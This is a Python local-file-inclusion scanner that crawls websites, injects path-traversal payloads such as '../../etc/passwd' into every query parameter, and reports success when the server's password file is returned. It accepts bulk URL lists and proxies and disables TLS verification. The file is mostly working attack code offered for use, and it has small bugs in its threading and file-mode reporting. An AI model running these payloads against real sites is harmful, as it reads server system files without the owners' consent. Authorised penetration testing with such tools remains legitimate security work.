import argparse
import requests
import re
import html
import urllib3
import json
import csv
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse, parse_qs, urljoin
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings
urllib3.disable_warnings(InsecureRequestWarning)

class LFIScanner:
    def __init__(self, threads=5, proxy=None, depth=0):
        self.threads = threads
        self.proxies = self._prepare_proxy(proxy)
        self.payloads = ["../../etc/passwd", "%2e%2e%2fetc/passwd", "....//....//etc/passwd"]
        self.crawl_depth = depth
        self.session = requests.Session()
        self.session.verify = False  # Disable SSL verification

    def _prepare_proxy(self, proxy):
        if proxy:
            if not proxy.startswith(('http://', 'https://')):
                proxy = f'http://{proxy}'
            return {
                'http': proxy,
                'https': proxy
            }
        return None

    def scan_url(self, url):
        """Scan a single URL and its crawled pages for LFI vulnerabilities"""
        crawled_urls = self._crawl(url, self.crawl_depth) if self.crawl_depth > 0 else [url]
        vulnerable = []
        
        for crawled_url in crawled_urls:
            parsed = urlparse(crawled_url)
            params = parse_qs(parsed.query)
            
            if not params:
                print(f"[!] No parameters found in {crawled_url}")
                continue
            
            for param in params:
                for payload in self.payloads:
                    test_url = self._inject_payload(crawled_url, param, payload)
                    if self._is_vulnerable(test_url):
                        print(f"[+] Vulnerable: {test_url}")
                        vulnerable.append({
                            'url': crawled_url,
                            'parameter': param,
                            'payload': payload,
                            'timestamp': datetime.now().isoformat()
                        })
        
        return vulnerable

    def _crawl(self, start_url, max_depth):
        """Crawl the website up to specified depth and collect URLs"""
        visited = set()
        queue = [(start_url, 0)]
        base_domain = urlparse(start_url).netloc
        crawled_urls = set()

        while queue:
            current_url, current_depth = queue.pop(0)
            
            if current_url in visited:
                continue
            visited.add(current_url)

            if current_depth > max_depth:
                continue

            try:
                response = self.session.get(
                    current_url,
                    proxies=self.proxies,
                    timeout=10
                )
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract and process links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    absolute_url = urljoin(current_url, href)
                    parsed = urlparse(absolute_url)
                    
                    if parsed.netloc == base_domain:
                        if absolute_url not in visited:
                            queue.append((absolute_url, current_depth + 1))
                            crawled_urls.add(absolute_url)
                
            except Exception as e:
                print(f"[-] Error crawling {current_url}: {str(e)}")
                continue

        return list(crawled_urls)

    def _inject_payload(self, url, param, payload):
        """Inject payload into the specified parameter"""
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = "&".join([f"{k}={v[0]}" for k, v in query.items()])
        return parsed._replace(query=new_query).geturl()

    def _is_vulnerable(self, url):
        """Check if response indicates successful exploitation"""
        try:
            response = self.session.get(
                url,
                proxies=self.proxies,
                timeout=10
            )
            return "root:x:" in response.text
        except Exception as e:
            print(f"[-] Error testing {url}: {str(e)}")
            return False

    def generate_report(self, results, format="json"):
        """Generate report in specified format"""
        if format == "json":
            with open("report.json", "w") as f:
                json.dump(results, f, indent=2)
        elif format == "csv":
            with open("report.csv", "w", newline='') as f:
                writer = csv.writer(f)
                writer.writerow(["URL", "Parameter", "Payload", "Timestamp"])
                for item in results:
                    writer.writerow([
                        item['url'],
                        item['parameter'],
                        item['payload'],
                        item['timestamp']
                    ])

def main():
    parser = argparse.ArgumentParser(description="Advanced LFI Scanner with Crawling")
    parser.add_argument("-u", "--url", help="Single URL to test")
    parser.add_argument("-f", "--file", help="File containing list of URLs")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("-p", "--proxy", help="Proxy (e.g., 127.0.0.1:8080)")
    parser.add_argument("-d", "--depth", type=int, default=0, 
                      help="Crawl depth (0=no crawling)")
    parser.add_argument("-o", "--output", help="Output format (json/csv)")
    
    args = parser.parse_args()
    scanner = LFIScanner(threads=args.threads, proxy=args.proxy, depth=args.depth)

    results = []
    if args.url:
        print(f"[*] Scanning {args.url} with crawl depth {args.depth}")
        results = scanner.scan_url(args.url)
        print(f"[*] Found {len(results)} vulnerabilities")
        
    elif args.file:
        print(f"[*] Scanning URLs from {args.file}")
        with open(args.file, "r") as f:
            urls = f.read().splitlines()
        
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            results = list(executor.map(scanner.scan_url, urls))
        
        print(f"[*] Completed scanning {len(urls)} URLs")
        
    else:
        print("[-] Please specify a URL (-u) or file (-f)")

    if args.output and results:
        scanner.generate_report(results, args.output)
        print(f"[*] Report generated in {args.output} format")

if __name__ == "__main__":
    main()
